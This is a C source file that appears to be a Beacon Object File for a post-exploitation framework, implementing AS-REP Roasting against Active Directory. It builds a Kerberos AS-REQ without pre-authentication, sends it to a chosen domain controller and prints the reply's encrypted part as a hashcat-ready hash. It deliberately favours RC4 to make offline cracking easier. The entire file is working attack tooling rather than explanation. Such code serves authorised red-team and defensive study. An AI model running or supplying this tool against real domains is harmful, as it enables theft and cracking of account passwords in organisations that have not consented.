/*
 * krb_asreproasting - AS-REP Roasting for accounts without pre-authentication
 *
 * Usage: krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Build AS-REQ without pre-authentication */
static void build_asrep_roast_request(KRB_BUFFER* out, const char* domain, const char* username) {
    KRB_BUFFER asreq, pvno, msg_type, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&asreq, 2048);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 256);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Build req-body first */
    kdc_opts[0] = (BYTE)((kdc_options >> 24) & 0xFF);
    kdc_opts[1] = (BYTE)((kdc_options >> 16) & 0xFF);
    kdc_opts[2] = (BYTE)((kdc_options >> 8) & 0xFF);
    kdc_opts[3] = (BYTE)(kdc_options & 0xFF);

    /* kdc-options [0] */
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* cname [1] - client principal */
    KRB_BUFFER cname, cname_type, cname_strings, cname_seq;
    buf_init(&cname, 128);
    buf_init(&cname_type, 16);
    buf_init(&cname_strings, 64);
    buf_init(&cname_seq, 64);

    asn1_encode_integer(&cname_type, KRB5_NT_PRINCIPAL);
    asn1_context_wrap(&cname, 0, &cname_type);
    asn1_encode_general_string(&cname_strings, username);
    asn1_wrap(&cname_seq, ASN1_SEQUENCE, &cname_strings);
    asn1_context_wrap(&cname, 1, &cname_seq);
    asn1_wrap(&tmp, ASN1_SEQUENCE, &cname);
    asn1_context_wrap(&body, 1, &tmp);
    buf_reset(&tmp);

    buf_free(&cname);
    buf_free(&cname_type);
    buf_free(&cname_strings);
    buf_free(&cname_seq);

    /* realm [2] */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* sname [3] - krbtgt/REALM */
    KRB_BUFFER sname, sname_type, sname_strings, sname_seq;
    buf_init(&sname, 128);
    buf_init(&sname_type, 16);
    buf_init(&sname_strings, 128);
    buf_init(&sname_seq, 128);

    asn1_encode_integer(&sname_type, KRB5_NT_SRV_INST);
    asn1_context_wrap(&sname, 0, &sname_type);
    asn1_encode_general_string(&sname_strings, "krbtgt");
    asn1_encode_general_string(&sname_strings, domain);
    asn1_wrap(&sname_seq, ASN1_SEQUENCE, &sname_strings);
    asn1_context_wrap(&sname, 1, &sname_seq);
    asn1_wrap(&tmp, ASN1_SEQUENCE, &sname);
    asn1_context_wrap(&body, 3, &tmp);
    buf_reset(&tmp);

    buf_free(&sname);
    buf_free(&sname_type);
    buf_free(&sname_strings);
    buf_free(&sname_seq);

    /* till [5] */
    asn1_encode_generalized_time(&tmp, "20370913024805Z");
    asn1_context_wrap(&body, 5, &tmp);
    buf_reset(&tmp);

    /* nonce [7] */
    asn1_encode_integer(&tmp, 12345678);
    asn1_context_wrap(&body, 7, &tmp);
    buf_reset(&tmp);

    /* etype [8] - prefer RC4 for easier cracking */
    asn1_encode_integer(&etype_list, ETYPE_RC4_HMAC);
    asn1_encode_integer(&etype_list, ETYPE_AES256_CTS_HMAC_SHA1);
    asn1_encode_integer(&etype_list, ETYPE_AES128_CTS_HMAC_SHA1);
    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);

    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);


    /* pvno [1] */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* msg-type [2] */
    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* No padata [3] - this is the key! */

    /* req-body [4] */
    asn1_context_wrap(&asreq, 4, &req_body);


    KRB_BUFFER seq_wrap;
    buf_init(&seq_wrap, asreq.length + 8);
    asn1_wrap(&seq_wrap, ASN1_SEQUENCE, &asreq);

    buf_append_byte(out, ASN1_APP(KRB5_AS_REQ));
    asn1_encode_length(out, seq_wrap.length);
    buf_append(out, seq_wrap.data, seq_wrap.length);

    buf_free(&seq_wrap);
    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Parse AS-REP and extract hash */
static int extract_asrep_hash(const BYTE* data, size_t len, const char* username,
                               const char* domain, formatp* output) {
    size_t offset = 0;


    if (data[offset] != ASN1_APP(KRB5_AS_REP)) {
        if (data[offset] == ASN1_APP(KRB5_ERROR)) {
            /* Parse error code */
            offset++;
            asn1_decode_length(data, &offset);

            /* Search for error-code */
            while (offset < len - 10) {
                if (data[offset] == ASN1_CONTEXT(6)) {
                    offset++;
                    asn1_decode_length(data, &offset);
                    if (data[offset] == ASN1_INTEGER) {
                        offset++;
                        size_t int_len = asn1_decode_length(data, &offset);
                        int error_code = 0;
                        for (size_t i = 0; i < int_len && i < 4; i++) {
                            error_code = (error_code << 8) | data[offset + i];
                        }

                        if (error_code == KDC_ERR_PREAUTH_REQUIRED) {
                            BeaconFormatPrintf(output, "[-] Pre-authentication IS required for %s\n", username);
                        } else if (error_code == KDC_ERR_C_PRINCIPAL_UNKNOWN) {
                            BeaconFormatPrintf(output, "[-] User %s not found in domain\n", username);
                        } else if (error_code == KDC_ERR_CLIENT_REVOKED) {
                            BeaconFormatPrintf(output, "[-] Account %s is disabled/locked\n", username);
                        } else {
                            BeaconFormatPrintf(output, "[-] KRB-ERROR %d for %s\n", error_code, username);
                        }
                        return 0;
                    }
                }
                offset++;
            }
        }
        return 0;
    }

    BeaconFormatPrintf(output, "[+] VULNERABLE! %s does not require pre-authentication!\n", username);

    /* Find enc-part for hash extraction */
    int etype = 0;
    const BYTE* cipher = NULL;
    size_t cipher_len = 0;

    offset = 1;
    asn1_decode_length(data, &offset);

    /* Skip to SEQUENCE */
    if (data[offset] == ASN1_SEQUENCE) {
        offset++;
        asn1_decode_length(data, &offset);
    }

    /* Look for context tags */
    while (offset < len - 4) {
        BYTE tag = data[offset];
        if ((tag & 0xE0) != 0xA0) break;

        offset++;
        size_t field_len = asn1_decode_length(data, &offset);
        size_t field_start = offset;

        /* enc-part is [6] */
        if (tag == ASN1_CONTEXT(6)) {
            /* EncryptedData SEQUENCE */
            if (data[offset] == ASN1_SEQUENCE) {
                offset++;
                asn1_decode_length(data, &offset);

                while (offset < field_start + field_len) {
                    BYTE enc_tag = data[offset];
                    offset++;
                    size_t enc_len = asn1_decode_length(data, &offset);

                    if (enc_tag == ASN1_CONTEXT(0)) {
                        /* etype */
                        if (data[offset] == ASN1_INTEGER) {
                            offset++;
                            size_t int_len = asn1_decode_length(data, &offset);
                            for (size_t i = 0; i < int_len; i++) {
                                etype = (etype << 8) | data[offset + i];
                            }
                            offset += int_len;
                        } else {
                            offset += enc_len;
                        }
                    } else if (enc_tag == ASN1_CONTEXT(2)) {
                        /* cipher */
                        if (data[offset] == ASN1_OCTETSTRING) {
                            offset++;
                            cipher_len = asn1_decode_length(data, &offset);
                            cipher = data + offset;
                            offset += cipher_len;
                        } else {
                            offset += enc_len;
                        }
                    } else {
                        offset += enc_len;
                    }
                }
            }
            break;
        }
        offset = field_start + field_len;
    }

    if (cipher && cipher_len > 0) {
        BeaconFormatPrintf(output, "[*] Encryption type: %d (%s)\n", etype, etype_string(etype));
        BeaconFormatPrintf(output, "[*] Cipher length: %d bytes\n\n", (int)cipher_len);

        /* Format hash for cracking */
        if (etype == ETYPE_RC4_HMAC && cipher_len > 16) {
            char* checksum_b64 = (char*)malloc(32);
            char* edata_b64 = (char*)malloc(cipher_len * 2);

            if (checksum_b64 && edata_b64) {
                base64_encode(cipher, 16, checksum_b64);
                base64_encode(cipher + 16, cipher_len - 16, edata_b64);

                BeaconFormatPrintf(output, "[*] Hash (hashcat mode 18200):\n");
                BeaconFormatPrintf(output, "$krb5asrep$%d$%s@%s:%s$%s\n\n",
                                   etype, username, domain, checksum_b64, edata_b64);
            }

            if (checksum_b64) free(checksum_b64);
            if (edata_b64) free(edata_b64);
        } else {
            /* AES or other - different format */
            char* cipher_b64 = (char*)malloc(cipher_len * 2);
            if (cipher_b64) {
                base64_encode(cipher, cipher_len, cipher_b64);
                BeaconFormatPrintf(output, "[*] Hash:\n$krb5asrep$%d$%s@%s:%s\n\n",
                                   etype, username, domain, cipher_b64);
                free(cipher_b64);
            }
        }
        return 1;
    }

    BeaconFormatPrintf(output, "[-] Could not extract cipher from AS-REP\n");
    return 0;
}


void go(char* args, int alen) {
    WSADATA wsaData;
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);

    char* user = arg_get(&parser, "user");
    char* domain = arg_get(&parser, "domain");
    char* dc = arg_get(&parser, "dc");

    if (!user) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN]");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconPrintf(CALLBACK_ERROR, "Could not determine domain. Specify /domain:");
            goto cleanup;
        }
    }

    if (!dc) {
        BeaconPrintf(CALLBACK_ERROR, "Please specify /dc: with domain controller IP");
        goto cleanup;
    }


    char* domain_upper = (char*)malloc(strlen(domain) + 1);
    strcpy(domain_upper, domain);
    strupr(domain_upper);

    BeaconFormatPrintf(&output, "[*] Action: AS-REP Roasting\n");
    BeaconFormatPrintf(&output, "[*] Target user: %s@%s\n", user, domain_upper);
    BeaconFormatPrintf(&output, "[*] DC: %s\n\n", dc);


    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "WSAStartup failed");
        free(domain_upper);
        goto cleanup;
    }


    KRB_BUFFER as_req;
    buf_init(&as_req, 2048);
    build_asrep_roast_request(&as_req, domain_upper, user);

    /* Connect to KDC */
    SOCKET sock = connect_to_kdc(dc, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to KDC %s:%d\n", dc, KRB5_PORT);
        buf_free(&as_req);
        WS2_32$WSACleanup();
        free(domain_upper);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Sending AS-REQ without pre-authentication...\n");
    BeaconFormatPrintf(&output, "[DEBUG] AS-REQ size: %d bytes\n", (int)as_req.length);
    if (as_req.length >= 8) {
        BeaconFormatPrintf(&output, "[DEBUG] AS-REQ hex: %02X %02X %02X %02X %02X %02X %02X %02X...\n",
            as_req.data[0], as_req.data[1], as_req.data[2], as_req.data[3],
            as_req.data[4], as_req.data[5], as_req.data[6], as_req.data[7]);
    }


    int sent = send_krb_msg(sock, as_req.data, as_req.length);
    BeaconFormatPrintf(&output, "[DEBUG] Sent %d bytes\n", sent);
    if (sent <= 0) {
        BeaconFormatPrintf(&output, "[-] Failed to send AS-REQ\n");
        WS2_32$closesocket(sock);
        buf_free(&as_req);
        WS2_32$WSACleanup();
        free(domain_upper);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }


    BYTE recv_buf[16384];
    int recv_len = recv_krb_msg(sock, recv_buf, sizeof(recv_buf));
    int last_err = WS2_32$WSAGetLastError();

    WS2_32$closesocket(sock);
    buf_free(&as_req);

    BeaconFormatPrintf(&output, "[DEBUG] Received %d bytes (WSA error: %d)\n", recv_len, last_err);

    if (recv_len > 4) {
        BeaconFormatPrintf(&output, "[DEBUG] First bytes: %02X %02X %02X %02X %02X\n",
                          recv_buf[0], recv_buf[1], recv_buf[2], recv_buf[3], recv_buf[4]);
        extract_asrep_hash(recv_buf + 4, recv_len - 4, user, domain_upper, &output);
    } else if (recv_len > 0) {
        BeaconFormatPrintf(&output, "[-] Partial response from KDC (%d bytes)\n", recv_len);
        BeaconFormatPrintf(&output, "[DEBUG] Length prefix bytes: %02X %02X %02X %02X\n",
                          recv_buf[0], recv_buf[1], recv_buf[2], recv_buf[3]);
        DWORD expected_len = ((DWORD)recv_buf[0] << 24) | ((DWORD)recv_buf[1] << 16) |
                             ((DWORD)recv_buf[2] << 8) | (DWORD)recv_buf[3];
        BeaconFormatPrintf(&output, "[DEBUG] Expected message length: %u bytes\n", expected_len);
    } else {
        BeaconFormatPrintf(&output, "[-] No response from KDC (recv returned %d)\n", recv_len);
    }

    WS2_32$WSACleanup();
    free(domain_upper);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (user) free(user);
    if (domain) free(domain);
    if (dc) free(dc);
}
